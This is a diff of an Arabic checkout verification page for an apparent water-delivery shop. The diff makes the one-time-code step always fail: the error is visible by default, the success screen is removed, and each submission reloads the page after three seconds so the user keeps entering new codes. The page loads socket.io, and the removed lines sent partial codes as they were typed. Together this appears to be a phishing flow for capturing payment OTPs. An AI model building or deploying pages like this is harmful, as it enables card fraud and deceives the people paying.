@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>التحقق - مياه واحة عمان</title>
+  <title>خطأ في التحقق - مياه واحة عمان</title>
   <link rel="stylesheet" href="../css/style.css">
   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 </head>
@@ -52,8 +52,8 @@
         <span class="step-label">الدفع</span>
       </div>
       <div class="step-line"></div>
-      <div class="step active">
-        <div class="step-number">4</div>
+      <div class="step error">
+        <div class="step-number">✕</div>
         <span class="step-label">التحقق</span>
       </div>
     </div>
@@ -84,19 +84,20 @@
                  required inputmode="numeric" autocomplete="off">
         </div>
         
-        <div id="otpError" class="otp-error" style="display:none;">
+        <!-- ERROR MESSAGE VISIBLE BY DEFAULT -->
+        <div id="otpError" class="otp-error">
           <span>✕</span>
-          <span>الرمز المدخل غير صحيح، يرجى إدخال الرمز بشكل صحيح أو انتظار رمز جديد</span>
+          <span>تم إدخال رمز غير صحيح، يرجى انتظار رمز جديد</span>
         </div>
         
         <div id="otpLoading" class="otp-loading" style="display:none;">
           <div class="loading-spinner"></div>
-          <span>جارٍ التحميل، يرجى الانتظار...</span>
+          <span>جارٍ التحقق من الرمز...</span>
         </div>
         
         <button type="submit" id="verifyBtn" class="btn btn-success" style="width:100%;padding:16px;">
-          <span>تأكيد الطلب</span>
-          <span>✓</span>
+          <span>إعادة المحاولة</span>
+          <span>↻</span>
         </button>
       </form>
       
@@ -107,20 +108,6 @@
       <div class="demo-hint">
         💡 للتجربة: الرمز هو <strong>123456</strong>
       </div>
-    </div>
-  </div>
-
-  <div id="successModal" class="success-modal" style="display:none;">
-    <div class="success-content">
-      <div class="success-icon">🎉</div>
-      <h2>تم تأكيد طلبك بنجاح!</h2>
-      <p>شكراً لك! سيتم التواصل معك قريباً لتأكيد موعد التوصيل.</p>
-      <div class="order-id">
-        رقم الطلب: <strong id="orderId"></strong>
-      </div>
-      <a href="../index.html" class="btn btn-primary" style="width:100%;">
-        العودة للرئيسية
-      </a>
     </div>
   </div>
 
@@ -152,12 +139,17 @@
     }
     .otp-error {
       display: flex; align-items: center; justify-content: center; gap: 8px;
-      padding: 12px 16px; background: rgba(239, 68, 68, 0.1);
-      border: 1px solid rgba(239, 68, 68, 0.3); border-radius: var(--border-radius-sm);
-      margin-bottom: 16px; font-size: 13px; color: var(--danger);
-      animation: fadeIn 0.3s ease;
+      padding: 12px 16px; background: rgba(239, 68, 68, 0.15);
+      border: 2px solid rgba(239, 68, 68, 0.5); border-radius: var(--border-radius-sm);
+      margin-bottom: 16px; font-size: 14px; color: #ef4444;
+      font-weight: 600;
+      animation: fadeIn 0.3s ease, pulse-error 2s ease-in-out infinite;
     }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes pulse-error {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4); }
+      50% { box-shadow: 0 0 0 8px rgba(239, 68, 68, 0); }
+    }
     .otp-loading {
       display: flex; flex-direction: column; align-items: center; justify-content: center;
       gap: 16px; padding: 24px; background: rgba(99, 102, 241, 0.05);
@@ -176,6 +168,12 @@
       margin-top: 20px; padding: 16px; background: rgba(245, 158, 11, 0.1);
       border: 1px solid rgba(245, 158, 11, 0.3); border-radius: var(--border-radius-sm);
       font-size: 13px; color: var(--accent);
+    }
+    
+    /* Step error state */
+    .step.error .step-number {
+      background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+      animation: pulse-error 2s ease-in-out infinite;
     }
   </style>
 
@@ -200,11 +198,9 @@
       inputs.forEach(function(input, index) {
         input.addEventListener('input', function() {
           input.classList.remove('error');
-          document.getElementById('otpError').style.display = 'none';
           
           var otp = '';
           inputs.forEach(function(inp) { otp += inp.value; });
-          if (otp.length >= 4) { submitVerificationForm({ otpPartial: otp }); }
         });
         
         input.addEventListener('keydown', function(e) {
@@ -245,13 +241,14 @@
         // SECURITY: Clear OTP field immediately after submission
         inputs.forEach(function(input) { input.value = ''; });
         
-        // EXACT 3 seconds loading
+        // EXACT 3 seconds loading then reload page
         setTimeout(function() {
-          // Redirect to error page after exactly 3 seconds
-          window.location.href = 'errorotp.html';
+          // Reload the same page (simulates checking again)
+          window.location.reload();
         }, 3000);
       });
       
+      // Focus first input
       if (inputs[0]) inputs[0].focus();
     });
   </script>
